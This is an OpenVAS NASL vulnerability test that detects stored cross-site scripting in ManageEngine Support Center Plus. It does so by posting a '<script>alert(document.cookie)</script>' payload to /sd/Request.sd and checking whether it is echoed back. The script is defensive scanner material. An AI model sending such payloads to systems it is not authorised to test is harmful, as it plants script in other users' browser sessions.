###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_support_plus_mult_fields_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Zoho ManageEngine Support Center Plus Multiple Fields XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "ManageEngine Support Center Plus 7.9 Upgrade Pack 7903 and prior";
tag_insight = "The flaws are due to inputs passed to the 'Name' and 'E-mail'
  parameters via 'sd/Request.sd' script is not properly sanitised before
  being returned to the user.";
tag_solution = "Upgrade to ManageEngine Support Center Plus 7.9 Upgrade Pack 7908 or later
  For updates refer to http://www.manageengine.com/products/support-center/";
tag_summary = "This host is running Zoho ManageEngine Support Center Plus and is
  prone to multiple cross site scripting vulnerabilities.";

if(description)
{
  script_id(802839);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53019);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-24 13:18:35 +0530 (Tue, 24 Apr 2012)");
  script_name("Zoho ManageEngine Support Center Plus Multiple Fields XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/81156");
  script_xref(name : "URL" , value : "http://1337day.com/exploits/18057");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74873");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18745/");

  script_description(desc);
  script_summary("Check if Zoho ManageEngine Support Center Plus is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
url = "";
req = "";
res = "";
host = "";
postdata = "";

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 80;
}

## Check port status
if(!get_port_state(port)) {
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

sndReq = http_get(item:"/", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && ">ManageEngine SupportCenter Plus<" >< rcvRes &&
   "ZOHO Corp" >< rcvRes)
{
  url = "/sd/Request.sd";
  postdata = "departmentID=1&userName=<script>alert(document.cookie)</script>" +
             "&emailID=abc%40gmail.com&title=XSS-TEST&description=ggg&save=" +
             "Submit";

  ## Construct attack request
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, ":", port, "\r\n",
               "Cookie: JSESSIONID=B15D245B03E7FE757424FA08D41E01AB; " +
               "PREV_CONTEXT_PATH=; JSESSIONID=A8CF0BA0D9E4C252DC00EE2B7EB6FAE8\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

  ## Try XSS Attack
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(res && egrep(pattern:"^HTTP/.* 200 OK", string:res) &&
     "Customer Portal" >< res &&
     "<script>alert(document.cookie)</script>" >< res){
    security_warning(port);
  }
}
